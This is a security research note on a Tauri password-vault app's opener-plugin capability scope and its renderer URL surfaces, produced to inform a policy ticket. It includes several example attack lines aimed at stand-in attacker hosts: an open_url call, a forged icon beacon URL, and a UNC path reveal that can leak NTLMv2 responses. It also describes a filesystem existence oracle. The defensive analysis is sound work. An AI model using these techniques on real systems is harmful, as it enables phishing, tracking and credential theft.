# Opener capability scope and renderer URL surfaces

Research ticket: [#66](https://github.com/DylanAlmond/lockr/issues/66) — facts only; the policy decision is out of scope.

## Sources inspected

| Source | What it establishes |
| --- | --- |
| `src-tauri/capabilities/default.json:8` | The main window is granted `opener:default` |
| `src-tauri/Cargo.toml:22`, `src-tauri/Cargo.lock:3737-3740` | `tauri-plugin-opener` resolves to **2.5.4** |
| `~/.cargo/registry/src/index.crates.io-*/tauri-plugin-opener-2.5.4/permissions/default.toml:3-10` | What `opener:default` expands to |
| `.../tauri-plugin-opener-2.5.4/permissions/allow-default-urls.toml:7-17` | The default URL scope entries |
| `.../tauri-plugin-opener-2.5.4/src/commands.rs:14-76` | Which commands check scope, and which do not |
| `.../tauri-plugin-opener-2.5.4/src/scope.rs:62-140` | URL/path matching rules and the `with` (program) check |
| `.../tauri-plugin-opener-2.5.4/src/reveal_item_in_dir.rs`, `windows_shell_path.rs` | Windows reveal implementation |
| `node_modules/@tauri-apps/plugin-opener/package.json` (2.5.4), `dist-js/index.js` | Renderer-side API and IPC command names |
| `src-tauri/gen/schemas/acl-manifests.json` (`opener`) | The app's compiled ACL: same permission set and same scope entries |
| `.../glob-0.3.3/src/lib.rs:766,1095-1096` (`Cargo.lock:1567-1568`) | Glob matching semantics used by the scope |

No published docs were needed; every claim below is from the installed crate source. The doc comment in `node_modules/@tauri-apps/plugin-opener/dist-js/index.js:9-21` still describes the v1 regex (`^((mailto:\w+)|(tel:\w+)|(https?://\w+)).+`). **That is stale and does not describe 2.5.4** — 2.5.4 uses glob patterns, not a regex.

## 1. What `opener:default` actually permits

`permissions/default.toml` expands `default` to exactly three permissions:

```toml
permissions = [
  "allow-open-url",        # enables plugin:opener|open_url
  "allow-reveal-item-in-dir", # enables plugin:opener|reveal_item_in_dir
  "allow-default-urls",    # supplies the URL scope
]
```

### Exact default scope

There is **no regex**. The scope is four glob patterns (`allow-default-urls.toml:7-17`), confirmed in the app's compiled manifest (`gen/schemas/acl-manifests.json`, `opener.permissions.allow-default-urls.scope.allow`):

```text
mailto:*
tel:*
http://*
https://*
```

Matching details (`scope.rs:80-85,117-124`; `glob` semantics from `glob-0.3.3/src/lib.rs:766,1095-1096`):

- `Pattern::matches` is a **whole-string** match, so these act as closed prefixes: anything before the scheme is rejected, anything after is accepted.
- `MatchOptions::new()` sets `require_literal_separator: false`, so `*` matches `/`, `?`, `#`, and arbitrary depth. `https://*` is effectively "all HTTPS".
- Matching is **case-sensitive** (`case_sensitive: true`), so `HTTPS://…` and `Http://…` are denied. This fails closed.
- There is **no `file://`**, no `mailto:`-adjacent custom schemes, no `search-ms:`, `ms-msdt:`, `smb:`, `steam:`, etc.

### Which commands are included

| Command (IPC name) | In `opener:default`? | Scope enforced? |
| --- | --- | --- |
| `plugin:opener\|open_url` | Yes (`allow-open-url`) | Yes — against the four globs (`commands.rs:36-40`) |
| `plugin:opener\|reveal_item_in_dir` | Yes (`allow-reveal-item-in-dir`) | **No** — the command takes no scope arguments at all (`commands.rs:72-76`) |
| `plugin:opener\|open_path` | **No** — `allow-open-path` is not in the set, and `opener:default` has zero `path` scope entries | N/A (ACL rejects the command) |

So: **no paths can be opened**, but **any existing path can be revealed in the file manager**. Even if someone later added `allow-open-path`, there are no `path` scope entries, so `is_path_allowed` would still return false (`scope.rs:126-140` filters `allowed` to `Entry::Path` only).

### The `with` parameter is pinned to the default application

`open_url`'s second parameter selects the program. Scope entries from `allow-default-urls` carry no `app` key, which deserializes to `Application::Default` (`scope_entry.rs:12-17,24-26`). `Application::Default` matches only when `with` is absent (`scope.rs:63-68`):

```rust
Self::Default => a.is_none(),
```

`commands.rs:36` passes `with.as_deref()` into that check before calling `app.opener().open_url(...)`. Therefore `open_url(url, "firefox")` — or `"calc"`, `"cmd"` — is **denied by scope**, not by argument validation.

### Windows backend

- `open.rs:9-15` delegates to the `open` crate (5.3.6, `Cargo.lock:2561-2562`).
- `tauri-plugin-opener` enables `open`'s `shellexecute-on-windows` feature (`.../Cargo.toml:59-61`), so `that_detached` uses `ShellExecuteExW` with `lpFile = <string>`, `lpVerb = null`, `lpParameters = null` (`open-5.3.6/src/windows.rs:67-94`). It is **not** a `cmd /c start` string and there is no shell parsing of the value.
- By contrast, `with_detached` sets `lpFile = app` (a program) and `lpParameters = path` (`open-5.3.6/src/windows.rs:110-124`). That is the arbitrary-program-execution primitive, and it is reachable only if `with` is permitted — which the scope forbids.

## 2. Renderer external-URL surfaces

**The renderer never calls the opener today.** `src-tauri/src/lib.rs:44` registers the plugin, and `package.json:16` declares `@tauri-apps/plugin-opener`, but there are no `plugin:*` invokes anywhere in `src/`, no `openUrl`/`openPath`/`revealItemInDir` imports, and no `window.open`. There are also **zero `<a>` elements, zero `target=` attributes, and no `location.href/assign/replace`** in `src/` — every navigation is an internal `RouterLink` (`Sidebar.vue:150-213`).

The remaining surface is vault/user-controlled strings reaching `<img src>`:

| Location | Value | Source |
| --- | --- | --- |
| `src/components/panel/AccountDetails.vue:199` | `account.icon` | vault item, renderer-writable via `update_item` (`useVault.ts:179`) |
| `src/components/panel/NoteDetails.vue:168` | `note.icon` | vault item |
| `src/components/panel/CardDetails.vue:238` | `card.icon` | vault item |
| `src/components/panel/IdentityDetails.vue:167` | `identity.icon` | vault item |
| `src/components/panel/ItemList.vue:248` | `item.icon` | vault item |
| `src/components/views/LoginView.vue:91`, `:131` | `selectedUser.icon`, `user.icon` | user profile (`useUser.ts:93`) |
| `src/components/layout/Sidebar.vue:131` | `user?.icon` | user profile |
| `src/components/ui/IconUpload.vue:58` | `modelValue` (preview) | form state |

Facts about this surface:

- The uploader converts files through a canvas to a `data:image/...` URL (`util/imageUpload.ts:6`, `IconUpload.vue:35`), but **no scheme allowlist is applied at render time**. A renderer that can call `update_item` can persist `icon: "https://attacker.example/x.png"`.
- Because `tauri.conf.json:27` sets `"csp": null`, Tauri injects no CSP, so remote images are not blocked by policy.
- Consequence is an outbound image request (IP/user-agent/referrer leak, tracking beacon), not navigation and not script execution. SVG loaded via `<img>` does not execute embedded script in Chromium/WebView2.
- `src/util/imageUpload.ts:280-284` builds `https://img.logo.dev/name/<encodeURIComponent(brandName)>?token=<VITE_LOGO_API_TOKEN>` and `fetch()`es it with a vault-derived display name. Its call sites are currently commented out (`AccountEdit.vue:114-137`, `NewAccountForm.vue:8`), so it is dead code — but if re-enabled it is an outbound request carrying user/vault data plus the API token.
- Vault-derived tags and note bodies are rendered as escaped text (`TagList.vue`, `<img>`-free), and there is no `v-html`, `innerHTML`, `eval`, or `new Function` anywhere in `src/`.

## 3. What a compromised renderer could and could not do

### Could

1. **Open any `http(s)`/`mailto`/`tel` URL in the OS default handler**, including attacker-chosen hosts (`invoke('plugin:opener|open_url', { url: 'https://attacker.example/', with: null })`). This is a phishing/credential-harvest vector and an outbound network request, but it is the same power as a normal web page link.
2. **Compose a `mailto:`/`tel:` handoff.** The string after `mailto:` is passed verbatim to the registered handler. Handler-specific parameters are the handler's decision — e.g. some mail clients accept an attachment path in a `mailto:` URL. That is a pre-filled draft requiring user action, not command execution. (Handler-dependent; not verified for this machine.)
3. **Reveal any existing filesystem path** in Explorer/macOS Finder/DBus FileManager1 (`reveal_item_in_dir`, no scope). This is unscoped by design in 2.5.4.
4. **Use reveal as a filesystem existence oracle.** The Windows path canonicalizer runs `path.exists()` and returns `NotFound` before any UI call (`windows_shell_path.rs:15-25`), so `Ok` vs `Err` distinguishes existing from non-existing paths.
5. **Trigger outbound SMB authentication via UNC paths.** `reveal_item_in_dir([r"\\attacker\share\x"])` reaches `path.exists()` (`windows_shell_path.rs:17`) and `ILCreateFromPathW` (`reveal_item_in_dir.rs:178-190`) with a UNC path, which makes Windows attempt an SMB connection and can leak an NTLMv2 response to the attacker's host. This is a network authentication attempt, not a file read.
6. **Forge icon URLs** to beacon out (see §2).

### Could not

- **Execute an arbitrary program.** The `with`/`openWith` parameter is the only program selector and is rejected unless it is absent (§1). `open_path` is not granted, so ShellExecute cannot be pointed at an executable path. Executables cannot be smuggled through `open_url` because the scope requires the literal prefix `http://`, `https://`, `mailto:`, or `tel:` before `ShellExecuteExW` sees the string.
- **Open a local file or `file://` URL** — `file://` is not in the scope, and `open_path` is denied by the ACL.
- **Read or write arbitrary files.** The plugin has no read/write API. Reveal opens a file-manager window; on Windows the fallback `ShellExecuteExW` is given the item's *parent directory* with the `explore` verb (or no verb for a directory), never the revealed file itself (`reveal_item_in_dir.rs:148-165`).
- **Use reveal for code execution.** Revealing `evil.exe` selects/highlights it in Explorer; it does not launch it.
- **Spawn a webview on an attacker origin.** `core:webview:default` grants only `get-all-webviews`, position/size, and devtools toggle — no `create-webview-window`; there is no `on_navigation` hook in `src-tauri/src/` either.

### The precise distinction

Opening a URL with the default browser is a **shell/OS protocol-handler dispatch**: Windows resolves the scheme from the string prefix and launches the registered handler. Executing a command with `open`'s `with` path is **`lpFile = <program>, lpParameters = <arg>`**, i.e. process creation with attacker-selected executable. The capability as granted exposes only the first, and only for four schemes. The gap between the two is exactly one scope rule — `Application::Default => a.is_none()` (`scope.rs:65`) — which is why `with` must stay outside any future scope expansion.

### Residual uncertainty

- The `mailto:` handler-parameter behavior (item 2) is OS/client configuration dependent and was not exercised.
- Whether WebView2 permits `file:///` or UNC targets in `<img src>` was not tested; it does not change the opener analysis.
- The capability targets `windows: ["main"]`; the config declares no explicit label, so Tauri's default `main` label applies. If a second window is ever added without its own capability, it does not inherit this one.

## Fact summary for the policy ticket

- `opener:default` = `open_url` (four glob prefixes: `mailto:*`, `tel:*`, `http://*`, `https://*`; `with` pinned to default handler) + `reveal_item_in_dir` (**no scope at all**) + **not** `open_path`.
- Renderer exposure today is latent: no call sites, no anchors, but the capability and JS package are present for any future or injected code.
- The only vault-derived outbound surface is `icon` strings rendered into `<img src>` under a null CSP.
- No path to arbitrary program execution or arbitrary file read/write exists in the granted set; the unscoped reveal command is the notable outlier (arbitrary existing-path reveal, existence oracle, UNC/NTLM egress).
